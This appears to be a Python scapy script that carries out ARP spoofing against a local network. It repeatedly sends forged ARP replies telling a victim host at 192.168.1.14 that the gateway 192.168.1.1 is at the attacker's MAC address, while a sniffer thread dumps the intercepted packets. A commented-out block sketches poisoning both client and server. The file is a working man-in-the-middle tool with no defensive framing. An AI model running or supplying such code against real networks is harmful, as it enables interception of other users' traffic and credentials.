#!/bin/python

from scapy.all import *
from socket import * 

import os
import sys
import time
import threading


NET_INTER = conf.iface.name
MY_IP = get_if_addr(NET_INTER)

pkt_forwarding = False

def try_set_forwarding(): 
    if os.system("sysctl net.ipv4.ip_forward=1") == 0:
        print("IP forwarding successfuly set!")
        pkt_forwarding = True
    else:
        print("Could not set IP forwarding! Will forward packets manualy.")


def pkt_handle(pkt: Packet):
    if IP in pkt and (pkt[IP].dst != MY_IP or pkt[IP].src != MY_IP) \
        and pkt[IP].src not in ["192.168.1.5", "192.168.1.7"]:
        return pkt.show(dump=True)


def main():
    #try_set_forwarding()
    my_mac = get_if_hwaddr(conf.iface.name)
    victim_mac = getmacbyip("192.168.1.14")
    #victim_mac = "ff:ff:ff:ff:ff:ff"
    print(victim_mac)

    thd = threading.Thread(target=sniff, kwargs={"prn": pkt_handle, "store": 0})
    thd.start()
    time.sleep(1)

    while True:
        ans = sendp(Ether(dst=victim_mac, src=my_mac) /
                    ARP(psrc='192.168.1.1', op="is-at", hwsrc=my_mac, 
                        hwdst=victim_mac, pdst='192.168.1.14'))
        time.sleep(2)
    pass


if __name__ == "__main__":
    main()

'''
thd = threading.Thread(target=sniff, kwargs={"prn": pkt_handle, "store": 0})
thd.start()
time.sleep(1)

while True: 
    sendp(eth/arp_client, verbose=False)
    sendp(eth/arp_server, verbose=False)
    time.sleep(10) # 1..2 secs maybe is the best
'''
